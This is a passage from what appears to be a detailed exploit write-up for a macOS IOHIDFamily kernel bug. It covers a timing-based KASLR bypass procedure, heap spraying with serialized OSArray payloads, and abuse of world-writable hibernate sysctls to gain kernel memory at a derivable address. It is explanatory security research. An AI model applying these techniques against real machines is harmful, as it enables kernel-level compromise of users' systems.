0xffffff801f900000    233     35     35     24     35     24     35     24     24     35     24     24     35     24     24     35
0xffffff801fa00000    711     24     35     24     35     24     35     35     24     24     35     24     24     35     35     35
0xffffff801fb00000    239     35     35     35     24     35     35     35     35    578    452     35     24     35     35     24
0xffffff801fc00000    534     24    741    685   1189     49     24     24     24     24     24     35     24     24     24     24
0xffffff801fd00000    617     35     35     24     35     24     35     24     35     35     24     35     24     35     35    443
0xffffff801fe00000    286     35     35     35     24     24     24     24     24     24     24     35     35     35     35     35
0xffffff801ff00000    236     24     24     24     35     24     24     35     24     35     24     35     24     35     24     35
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Here the kernel base is &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff800f200000&lt;/code&gt;, and the difference of timings before and after is very visible. Formalising what does or does not indicate the location of the kernel base isn’t trivial though, mostly due to outliers. By dull trial-and-error I have found the following procedure to be highly reliable, at least on my two machines:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Sort the 16 timings for each address from shortest to longest.&lt;/li&gt;
&lt;li&gt;Discard all but the middle 4 values, and calculate the average over those.&lt;/li&gt;
&lt;li&gt;If that value is below &lt;code class=&quot;highlighter-rouge&quot;&gt;50&lt;/code&gt;, treat the address as mapped, otherwise treat it as unmapped.&lt;/li&gt;
&lt;li&gt;Find the first block of mapped addresses large enough to contain the kernel’s &lt;code class=&quot;highlighter-rouge&quot;&gt;__TEXT&lt;/code&gt; segment.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;em&gt;This is implemented in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/kaslr.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/kaslr.c&lt;/code&gt;&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Despite the authors of the paper stating that their attack works also in virtualised environments, I observed timings for mapped and unmapped pages to be indistinguishable on a High Sierra installation running inside VirtualBox (and that’s the only VM I tried). But whatever, I’ve already shown that my bug can leak the kernel slide too if need be. :P&lt;/p&gt;
&lt;h3 id=&quot;getting-rip-control&quot;&gt;Getting &lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt; control&lt;/h3&gt;
&lt;p&gt;Back to corrupting stuff on the heap with &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;! Since we want things from here on out to work with both ways of leaking the kernel slide, we’re gonna have to assume that we’re back to not knowing the kernel address of our shared memory and not being able to read kernel memory - the only thing we can take for granted is the kernel slide. Now we’re back for more, and we’re here with a constraint: we want our exploit to run as fast a possible, i.e. fast enough that, on a shutdown, we’d be able to slip in between the user getting logged out and the kernel killing us.&lt;/p&gt;
&lt;p&gt;To that end we’re gonna do a single heap spray &lt;em&gt;before&lt;/em&gt; obtaining the &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt; port, and then avoid any kind of bulk iteration (except final deallocation), which includes both “reading back” and reallocating. In regard to our &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; capabilities, that eliminates all but the writing via &lt;code class=&quot;highlighter-rouge&quot;&gt;eventFlags&lt;/code&gt; while offsetting, and that in turn requires that laying waste to the memory surrounding our target memory be not fatal. Looking again at what we can allocate on the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt;/&lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt; (that is: data buffers, pointer arrays and kmsg’s), the only thing that lets us do that is again a pointer array, ideally containing a single pointer surrounded by nothingness, such as e.g. demonstrated earlier with our “inflated array”. This time we’re gonna change two things though:&lt;/p&gt;
&lt;ul readability=&quot;7&quot;&gt;&lt;li&gt;We’re gonna use &lt;code class=&quot;highlighter-rouge&quot;&gt;io_service_add_notification_ool&lt;/code&gt; rather than &lt;code class=&quot;highlighter-rouge&quot;&gt;IOSurface&lt;/code&gt; to call &lt;code class=&quot;highlighter-rouge&quot;&gt;OSUnserializeXML&lt;/code&gt; and keep the result in the kernel, because that returns us a mach port (which I’ll call the “notification port”). The nice thing about that is that we can invoke its destruction with the &lt;code class=&quot;highlighter-rouge&quot;&gt;_kernelrpc_mach_port_deallocate_trap&lt;/code&gt; mach trap, which means that we can deallocate the sprayed objects attached to it very fast, without even the need for a MIG message.&lt;/li&gt;
&lt;li readability=&quot;17&quot;&gt;
&lt;p&gt;Instead of just one inflated array, we’re gonna cram lots of them into a single port, so we can increase both allocation and deallocation efficiency, as well as decrease the overhead of whatever &lt;code class=&quot;highlighter-rouge&quot;&gt;io_service_add_notification_ool&lt;/code&gt; is &lt;em&gt;actually&lt;/em&gt; supposed to do. Here we’re limited to 4096 bytes of data we can feed to &lt;code class=&quot;highlighter-rouge&quot;&gt;OSUnserializeXML&lt;/code&gt; (which is just a property of the MIG message defined for &lt;code class=&quot;highlighter-rouge&quot;&gt;io_service_add_notification_ool&lt;/code&gt;), but the binary representation of an inflated array is &lt;em&gt;very&lt;/em&gt; short:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;kOSSerializeArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                             &lt;span class=&quot;c1&quot;&gt;// 4 bytes for the array
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kOSSerializeEndCollection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kOSSerializeBoolean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// and 4 bytes for its content
&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;If we take away 4 bytes each for the mandatory magic, dictionary tag, &lt;code class=&quot;highlighter-rouge&quot;&gt;OSSymbol&lt;/code&gt; tag, &lt;code class=&quot;highlighter-rouge&quot;&gt;OSSymbol&lt;/code&gt; contents and &lt;code class=&quot;highlighter-rouge&quot;&gt;OSArray&lt;/code&gt; tag (which will contain our inflated arrays), we could max this out at 509 inflated arrays per notification port! Due to later involvements however, we’re not gonna drive it that far and instead leave it at a nice 256, which is still more than enough.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;At that point the memory we’re targeting with &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; should have a lonely pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;kOSBooleanTrue&lt;/code&gt; every &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3000&lt;/code&gt; bytes, and all zeroes in between which are never used by the kernel. The avid reader might notice that &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3000&lt;/code&gt; is less than the size of our shared memory, but using a size of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6000&lt;/code&gt; wouldn’t help either, because we don’t know where exactly those pointers are anyway. We only know that they’re at the beginning of a page-aligned buffer, but on x86 there’s 3 pages in &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3000&lt;/code&gt;, which gets us back to &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;x + 0x1000&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;x + 0x2000&lt;/code&gt; as possible locations. So even if we chose &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6000&lt;/code&gt; instead, we’d just have 6 possible locations now and trying all of them would put us over the adjacent block just the same. In order to fix that, we first have to work out some other parts of our exploit though, so let’s just put that off until later.&lt;/p&gt;
&lt;p&gt;Now, we wanna corrupt a pointer, but to where? The only thing we have is the kernel slide, and whatever we change our pointer to, it’s gonna have to look at least in parts like a valid OSObject. There wouldn’t just be some user-writeable memory in the kernel’s __DATA segment that we could use or something, right? Turns out, there is! In &lt;a href=&quot;https://opensource.apple.com/source/xnu/xnu-4570.1.46/iokit/Kernel/IOHibernateIO.cpp.auto.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IOHibernateIO.cpp&lt;/code&gt;&lt;/a&gt; there is declared a &lt;code class=&quot;highlighter-rouge&quot;&gt;static hibernate_statistics_t _hibernateStats&lt;/code&gt;, where &lt;code class=&quot;highlighter-rouge&quot;&gt;hibernate_statistics_t&lt;/code&gt; is defined as follows:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hibernate_statistics_t&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image1Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imageSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image1Pages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imagePages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;booterStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smcStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;booterDuration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;booterConnectDisplayDuration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;booterSplashDuration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;booterDuration0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;booterDuration1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;booterDuration2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trampolineDuration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernelImageReadDuration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;graphicsReadyTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wakeNotificationTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockScreenReadyTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hidReadyTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wakeCapability&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resvA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hibernate_statistics_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hibernate_statistics_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And then, for reasons beyond my understanding, there exists this also in &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHibernateIO.cpp&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;19.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;SYSCTL_UINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_kern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OID_AUTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hibernategraphicsready&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CTLFLAG_RW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_NOAUTO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_KERN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_ANYBODY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_hibernateStats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;graphicsReadyTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SYSCTL_UINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_kern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OID_AUTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hibernatewakenotification&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CTLFLAG_RW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_NOAUTO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_KERN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_ANYBODY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_hibernateStats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wakeNotificationTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SYSCTL_UINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_kern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OID_AUTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hibernatelockscreenready&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CTLFLAG_RW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_NOAUTO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_KERN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_ANYBODY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_hibernateStats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lockScreenReadyTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SYSCTL_UINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_kern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OID_AUTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hibernatehidready&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CTLFLAG_RW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_NOAUTO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_KERN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_ANYBODY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_hibernateStats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hidReadyTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Well if &lt;code class=&quot;highlighter-rouge&quot;&gt;CTLFLAG_RW | CTLFLAG_ANYBODY&lt;/code&gt; isn’t an interesting combination on a global variable! In human terms, this means any process has full read-write capabilities on the struct members &lt;code class=&quot;highlighter-rouge&quot;&gt;graphicsReadyTime&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;wakeNotificationTime&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;lockScreenReadyTime&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;hidReadyTime&lt;/code&gt;, which, oh so conveniently, lie all next to each other!&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;bash$ sysctl kern.hibernategraphicsready
kern.hibernategraphicsready: 0
bash$ sysctl kern.hibernategraphicsready=123
kern.hibernategraphicsready: 0 -&amp;gt; 123
bash$ sysctl kern.hibernategraphicsready
kern.hibernategraphicsready: 123
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And on top of that, there’s this:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;9.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;SYSCTL_STRUCT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_kern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OID_AUTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hibernatestatistics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;CTLTYPE_STRUCT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_RD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_NOAUTO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_KERN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTLFLAG_LOCKED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
              &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_hibernateStats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hibernate_statistics_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This additionally gives us readonly access to &lt;em&gt;all&lt;/em&gt; of &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt;, which might come in handy when leaking data. Note that, like our bug, the entire facility containing these sysctl’s only exists on macOS, since hibernation is not a thing on mobile devices. Also, &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt; is not exported to the kernel’s symbol table, but obtaining its address is easy enough, given that the first statement in &lt;code class=&quot;highlighter-rouge&quot;&gt;hibernate_machine_init()&lt;/code&gt; (which &lt;em&gt;is&lt;/em&gt; exported) is a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;bzero&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;9.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;;-- _hibernate_machine_init:
0xffffff8000867c40      55             push rbp
0xffffff8000867c41      4889e5         mov rbp, rsp
0xffffff8000867c44      4157           push r15
0xffffff8000867c46      4156           push r14
0xffffff8000867c48      4155           push r13
0xffffff8000867c4a      4154           push r12
0xffffff8000867c4c      53             push rbx
0xffffff8000867c4d      4883ec78       sub rsp, 0x78
0xffffff8000867c51      488d3d708f2a.  lea rdi, 0xffffff8000b10bc8
0xffffff8000867c58      be90000000     mov esi, 0x90
0xffffff8000867c5d      e8de748aff     call sym.___bzero
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The address of &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt; is pretty evidently &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff8000b10bc8&lt;/code&gt; in this case.&lt;/p&gt;
&lt;p&gt;So we just made 16 bytes of writeable kernel memory whose address we can derive. At this point, let’s get back to the problem we put aside earlier of how we fix the corruption of adjacent pointers when offsetting &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;: the original pointer we’re corrupting has the value &lt;code class=&quot;highlighter-rouge&quot;&gt;kOSBooleanTrue&lt;/code&gt;, which is a location inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;zone_map&lt;/code&gt;. And the value we wanna rewrite it to is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;_hibernateStats&lt;/code&gt;, which is somewhere in the kernel’s &lt;code class=&quot;highlighter-rouge&quot;&gt;__DATA&lt;/code&gt; segment. What’s interesting about those two is that they aren’t so far apart - the main kernel binary always resides somewhere between &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff8000000000&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff8020000000&lt;/code&gt;, the &lt;code class=&quot;highlighter-rouge&quot;&gt;zone_map&lt;/code&gt; starts at values usually lower than &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff8040000000&lt;/code&gt;, and since &lt;code class=&quot;highlighter-rouge&quot;&gt;kOSBooleanTrue&lt;/code&gt; is allocated very early on, it’s exceedingly likely to not be too far off from the beginning of the &lt;code class=&quot;highlighter-rouge&quot;&gt;zone_map&lt;/code&gt;. Effectively, the addresses &lt;code class=&quot;highlighter-rouge&quot;&gt;kOSBooleanTrue&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;_hibernateStats&lt;/code&gt; will have the same top 32 bits, namely &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff80&lt;/code&gt;! For us, that means we only have to rewrite the lower 32 bits, which reduces the amount of memory we corrupt. So what memory &lt;em&gt;do&lt;/em&gt; we corrupt, exactly? We’re dealing with entire page sizes, and the only thing &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; has beyond the first page is &lt;code class=&quot;highlighter-rouge&quot;&gt;lleq&lt;/code&gt;. Now, I’ve created another little program in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/data/align.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;data/align.c&lt;/code&gt;&lt;/a&gt; that models five pages (all but the first) each holding a pointer in the first 8 bytes, and which simulates how the initialisation of &lt;code class=&quot;highlighter-rouge&quot;&gt;lleq&lt;/code&gt; intersects with each of these pointers. It takes a single signed int as command line argument, which is the amount of 4-byte-blocks by which &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; is to be shifted up or down. The output is displayed as a list of all addresses where &lt;code class=&quot;highlighter-rouge&quot;&gt;lleq&lt;/code&gt; initialisation happens, which could possibly intersect with a pointer. If intersection does indeed occur, the specific address is coloured red. Example:&lt;/p&gt;
